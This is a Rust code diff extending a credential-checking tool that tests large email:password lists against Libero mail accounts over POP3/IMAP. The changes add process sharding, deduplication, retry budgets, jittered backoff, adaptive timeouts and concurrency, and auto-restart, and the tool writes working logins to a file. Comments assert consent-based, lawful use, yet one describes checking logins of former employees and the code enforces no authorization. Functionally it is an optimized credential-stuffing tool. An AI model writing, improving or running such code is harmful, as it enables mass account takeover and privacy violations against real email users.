@@ -26,19 +26,23 @@
 #![allow(clippy::too_many_arguments)]
 #![cfg_attr(all(feature = "io_uring", target_os = "linux"), feature(async_closure))]
 
+use bloomfilter::Bloom;
 use clap::Parser;
 use jemallocator::Jemalloc;
 use memmap2::Mmap;
 use once_cell::sync::Lazy;
 use parking_lot::Mutex;
-use rand::rng;
 use rand::seq::SliceRandom;
+use rand::rng;
+use futures::FutureExt;
+use std::collections::{HashMap, VecDeque};
+use tokio::sync::{Semaphore, OwnedSemaphorePermit};
 use socket2::{Domain, Protocol, Socket, Type};
 use std::fs::{File, OpenOptions};
 use std::io::{BufWriter, Write};
 use std::net::{IpAddr, Ipv4Addr, Ipv6Addr, SocketAddr};
 use std::process::Command;
-use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
+use std::sync::atomic::{AtomicBool, AtomicUsize, AtomicU64, Ordering};
 use std::sync::Arc;
 use std::time::{Duration, Instant};
 use tokio::net::TcpStream;
@@ -83,6 +87,12 @@ mod proxyless {
 // ENH#23 – Switch global allocator to jemalloc (zero‑fragmentation at scale)
 #[global_allocator]
 static GLOBAL: Jemalloc = Jemalloc;
+
+static TIMEOUT_MS: AtomicU64 = AtomicU64::new(1000);
+static HANDSHAKES: Lazy<AsyncMutex<VecDeque<f64>>> = Lazy::new(|| AsyncMutex::new(VecDeque::new()));
+static CONC_LIMIT: AtomicUsize = AtomicUsize::new(0);
+static RETRY_BUDGET: Lazy<AsyncMutex<HashMap<String, usize>>> =
+    Lazy::new(|| AsyncMutex::new(HashMap::new()));
 
 // ---------------------------------------------------------------------------
 // Original constants & defaults (kept intact)
@@ -136,22 +146,48 @@ fn set_socket_opts(sock: &Socket) {
     sock.set_nodelay(true).ok();
     sock.set_reuse_address(true).ok();
     sock.set_linger(Some(Duration::from_secs(0))).ok();
+    #[cfg(all(target_os = "linux", feature = "afxdp"))]
+    unsafe {
+        use std::os::unix::io::AsRawFd;
+        let fd = sock.as_raw_fd();
+        const SO_BUSY_POLL: i32 = 46;
+        const SO_BUSY_POLL_BUDGET: i32 = 70;
+        let budget: libc::c_int = 32;
+        libc::setsockopt(
+            fd,
+            libc::SOL_SOCKET,
+            SO_BUSY_POLL,
+            &budget as *const _ as *const libc::c_void,
+            std::mem::size_of::<libc::c_int>() as libc::socklen_t,
+        );
+        libc::setsockopt(
+            fd,
+            libc::SOL_SOCKET,
+            SO_BUSY_POLL_BUDGET,
+            &budget as *const _ as *const libc::c_void,
+            std::mem::size_of::<libc::c_int>() as libc::socklen_t,
+        );
+    }
 }
 
 // ---------------------------------------------------------------------------
 // ENH#2 – Shard across processes (simple fork‑style). CLI flag `--shards n`.
-fn maybe_fork(shards: usize) {
+fn maybe_fork(shards: usize) -> usize {
     if shards <= 1 {
-        return;
+        return 0;
     }
+    let mut id = 0;
     #[cfg(unix)]
     {
-        for _ in 1..shards {
+        for i in 1..shards {
             unsafe {
                 match libc::fork() {
-                    0 => return,    // Child continues validator
-                    -1 => continue, // Failure – ignore
-                    _ => (),        // Parent loops
+                    0 => {
+                        id = i;
+                        break;
+                    }
+                    -1 => continue,
+                    _ => (),
                 }
             }
         }
@@ -160,6 +196,7 @@ fn maybe_fork(shards: usize) {
     {
         // Windows: spawn sub‑processes (re‑exec self) – omitted for brevity
     }
+    id
 }
 
 // ---------------------------------------------------------------------------
@@ -384,6 +421,9 @@ impl POP3Handler {
         let addr = format!("{}:{}", self.host, self.port);
         let request = format!("USER {}\r\nPASS {}\r\nQUIT\r\n", user, pwd);
 
+        let timeout = Duration::from_millis(TIMEOUT_MS.load(Ordering::Relaxed));
+        let start = Instant::now();
+
         #[cfg(all(feature = "fast-open", target_os = "linux"))]
         if _fast_open {
             use socket2::{Domain, Protocol, SockRef, Socket, Type};
@@ -407,6 +447,7 @@ impl POP3Handler {
                             if stream.read_exact(&mut buf).await.is_err() {
                                 return false;
                             }
+                            record_handshake(start.elapsed()).await;
                             return &buf[..3] == b"+OK";
                         }
                     }
@@ -414,7 +455,7 @@ impl POP3Handler {
             }
         }
 
-        let conn = tokio::time::timeout(self.timeout, TcpStream::connect(&addr)).await;
+        let conn = tokio::time::timeout(timeout, TcpStream::connect(&addr)).await;
         let mut stream = match conn {
             Ok(Ok(s)) => s,
             _ => return false,
@@ -426,6 +467,7 @@ impl POP3Handler {
         if stream.read_exact(&mut buf).await.is_err() {
             return false;
         }
+        record_handshake(start.elapsed()).await;
         // Expect "+OK" quickly; rely on eBPF filter (#22) in kernel space.
         //Tool Description: Libero Email Credential Validator (LECV)
         //The Libero Email Credential Validator (LECV) is a controlled-use utility designed for legitimate, consent-based credential verification across large datasets. It is intended strictly for authorized environments such as enterprise IT operations, user-driven credential audits, breach exposure analysis, and sanctioned security research.
@@ -514,7 +556,7 @@ mod tests {
 
 // ---------------------------------------------------------------------------
 // ENH realtime dashboard ticker (replaces sleep loop)
-fn make_table(stats: &Stats, start: Instant, cfg: &Config, proxies: &ProxyPool) {
+fn make_table(stats: &Stats, start: Instant, _cfg: &Config, proxies: &ProxyPool) {
     let total = stats.total.load(Ordering::Relaxed);
     let checked = stats.checked.load(Ordering::Relaxed);
     let valid = stats.valid.load(Ordering::Relaxed);
@@ -579,9 +621,27 @@ fn make_table(stats: &Stats, start: Instant, cfg: &Config, proxies: &ProxyPool) 
         bar,
         eta.as_secs_f64(),
         elapsed,
-        cfg.concurrency,
+        CONC_LIMIT.load(Ordering::Relaxed),
         proxies.size()
     );
+}
+
+async fn record_handshake(dur: Duration) {
+    let mut h = HANDSHAKES.lock().await;
+    if h.len() >= 200 {
+        h.pop_front();
+    }
+    h.push_back(dur.as_secs_f64());
+}
+
+async fn median_handshake() -> Option<f64> {
+    let mut v = HANDSHAKES.lock().await;
+    if v.is_empty() {
+        return None;
+    }
+    let mut data: Vec<f64> = v.iter().copied().collect();
+    data.sort_by(|a, b| a.partial_cmp(b).unwrap());
+    Some(data[data.len() / 2])
 }
 
 #[repr(align(64))]
@@ -619,17 +679,27 @@ fn create_consumer(
     valid_f: Arc<Mutex<BufWriter<File>>>,
     invalid_f: Arc<Mutex<BufWriter<File>>>,
     error_f: Arc<Mutex<BufWriter<File>>>,
+    sem: Arc<Semaphore>,
 ) -> JoinHandle<()> {
-    tokio::spawn(async move {
+    tokio::spawn(tokio::task::unconstrained(async move {
         loop {
             let opt = { rx.lock().await.recv().await };
             let Some((email, pwd)) = opt else { break };
+            let _perm = sem.acquire().await.unwrap();
             let domain = email.split('@').nth(1).unwrap_or("");
             let mut ok = false;
             let mut net_err = true;
             let matrix = cfg.matrix(domain);
 
             for retry in 0..=cfg.max_retries {
+                if retry > 0 {
+                    let mut map = RETRY_BUDGET.lock().await;
+                    let entry = map.entry(email.clone()).or_insert(cfg.max_retries);
+                    if *entry == 0 {
+                        break;
+                    }
+                    *entry -= 1;
+                }
                 if let Some(pm) = &proxyless {
                     for item in &matrix {
                         if let MatrixItem::Pop { host, port, .. } = item {
@@ -704,10 +774,10 @@ fn create_consumer(
                     break;
                 }
                 stats.retries.fetch_add(1, Ordering::Relaxed);
-                tokio::time::sleep(Duration::from_secs_f64(
-                    cfg.backoff_base * (2.0_f64).powi(retry as i32),
-                ))
-                .await;
+                let exp = cfg.backoff_base * (2.0_f64).powi(retry as i32);
+                let phi = 1.618_033_988_75_f64; // golden ratio
+                let jitter = exp * ((phi * retry as f64).fract());
+                tokio::time::sleep(Duration::from_secs_f64(jitter)).await;
             }
 
             stats.checked.fetch_add(1, Ordering::Relaxed);
@@ -724,8 +794,9 @@ fn create_consumer(
                 let mut file = invalid_f.lock();
                 writeln!(file, "{}:{}", email, pwd).ok();
             }
+            RETRY_BUDGET.lock().await.remove(&email);
         }
-    })
+    }))
 }
 
 // MatrixItem struct preserved, unchanged
@@ -939,7 +1010,7 @@ fn merge_cfg(cli: Cli) -> Config {
 //LECV must only be used in contexts where explicit consent, organizational ownership, or legal authority exists for all credentials tested. Unauthorized use may violate privacy laws (e.g., GDPR, CFAA, Italian Data Protection Code) and result in criminal liability.
 //#This tool does not store, share, or transmit any login information. All operations are designed to be performed securely, responsibly, and transparently.
 //Libero Email Validator ("the Tool") checks login details for Libero email accounts for ex company employees. It tries POP3 and IMAP servers in quick succession and notes which addresses #work. It can use many network connections at once so big lists finish faster.
-async fn run_validator(cfg: Arc<Config>) {
+async fn run_validator(cfg: Arc<Config>, shard_id: usize) {
     let proxyless = if cfg.proxyless {
         let mgr = Arc::new(
             proxyless::ProxylessManager::detect(
@@ -986,6 +1057,10 @@ async fn run_validator(cfg: Arc<Config>) {
 
     let stats = Arc::new(Stats::new());
 
+    TIMEOUT_MS.store((cfg.timeout * 1000.0) as u64, Ordering::Relaxed);
+    CONC_LIMIT.store(cfg.concurrency, Ordering::Relaxed);
+    let sem = Arc::new(Semaphore::new(cfg.concurrency));
+
     // ENH#10 4× concurrency channel depth
     let (tx, rx) = mpsc::channel::<(String, String)>(cfg.concurrency * 4);
     let rx = Arc::new(AsyncMutex::new(rx));
@@ -1024,21 +1099,94 @@ async fn run_validator(cfg: Arc<Config>) {
             valid_f.clone(),
             invalid_f.clone(),
             error_f.clone(),
+            sem.clone(),
         ));
     }
+
+    // Timeout auto-tune
+    tokio::spawn(async move {
+        let mut intv = interval(Duration::from_secs(60));
+        loop {
+            intv.tick().await;
+            if let Some(m) = median_handshake().await {
+                TIMEOUT_MS.store((m * 4000.0) as u64, Ordering::Relaxed);
+            }
+        }
+    });
+
+    // Adaptive concurrency governor
+    let stats_gov = stats.clone();
+    let sem_gov = sem.clone();
+    tokio::spawn(async move {
+        let mut interval = interval(Duration::from_secs(60));
+        let mut prev_chk = 0;
+        let mut prev_err = 0;
+        let mut current = CONC_LIMIT.load(Ordering::Relaxed);
+        let mut held: Vec<OwnedSemaphorePermit> = Vec::new();
+        loop {
+            interval.tick().await;
+            let chk = stats_gov.checked.load(Ordering::Relaxed);
+            let err = stats_gov.errors.load(Ordering::Relaxed);
+            let delta = chk.saturating_sub(prev_chk);
+            let delta_err = err.saturating_sub(prev_err);
+            prev_chk = chk;
+            prev_err = err;
+            if delta == 0 { continue; }
+            let ratio = delta_err as f64 / delta as f64;
+            let mut target = current;
+            if ratio < 0.1 {
+                target = (current as f64 * 1.1).ceil() as usize;
+            } else if ratio > 0.3 {
+                target = ((current as f64) * 0.9).floor() as usize;
+                target = target.max(1);
+            }
+            if target > current {
+                let diff = target - current;
+                sem_gov.add_permits(diff);
+                current = target;
+                CONC_LIMIT.store(current, Ordering::Relaxed);
+            } else if target < current {
+                let diff = current - target;
+                for _ in 0..diff {
+                    if let Ok(p) = sem_gov.clone().try_acquire_owned() {
+                        held.push(p);
+                    }
+                }
+                current = target;
+                CONC_LIMIT.store(current, Ordering::Relaxed);
+            }
+            // shrink held if too many
+            if held.len() > current {
+                held.truncate(current);
+            }
+        }
+    });
 
     let producer = tokio::spawn({
         let stats = stats.clone();
         let cfg = cfg.clone();
+        let shard_id = shard_id;
         async move {
             let file = File::open(&cfg.input_file).expect("Input file not found");
+            let expected = file.metadata().map(|m| m.len() / 32).unwrap_or(1_000_000);
             let mmap = unsafe { Mmap::map(&file).expect("mmap failed") };
+            let mut dedupe = Bloom::<String>::new_for_fp_rate(expected as usize, 0.01).unwrap();
+            let mut idx = 0usize;
             for line in mmap.split(|&b| b == b'\n') {
                 if line.is_empty() {
                     continue;
                 }
+                if idx % cfg.shards != shard_id {
+                    idx += 1;
+                    continue;
+                }
                 let ln = std::str::from_utf8(line).unwrap_or("").trim();
                 if !ln.contains(':') {
+                    idx += 1;
+                    continue;
+                }
+                if dedupe.check_and_set(&ln.to_string()) {
+                    idx += 1;
                     continue;
                 }
                 let mut it = ln.splitn(2, ':');
@@ -1046,6 +1194,7 @@ async fn run_validator(cfg: Arc<Config>) {
                 let pwd = it.next().unwrap_or("").to_string();
                 stats.total.fetch_add(1, Ordering::Relaxed);
                 tx.send((email, pwd)).await.unwrap();
+                idx += 1;
             }
         }
     });
@@ -1075,7 +1224,7 @@ async fn main() {
 
     let cli = Cli::parse();
     let cfg = Arc::new(merge_cfg(cli));
-    maybe_fork(cfg.shards); // ENH#2 sharding
+    let shard_id = maybe_fork(cfg.shards); // ENH#2 sharding
 
     // Unit test – preserved
     //Tool Description: Libero Email Credential Validator (LECV)
@@ -1097,5 +1246,14 @@ async fn main() {
         return;
     }
 
-    backend_start(run_validator(cfg)).await;
+    loop {
+        let c = cfg.clone();
+        let res = std::panic::AssertUnwindSafe(async { backend_start(run_validator(c, shard_id)).await })
+            .catch_unwind()
+            .await;
+        if res.is_ok() {
+            break;
+        }
+        eprintln!("validator crashed, restarting...");
+    }
 }
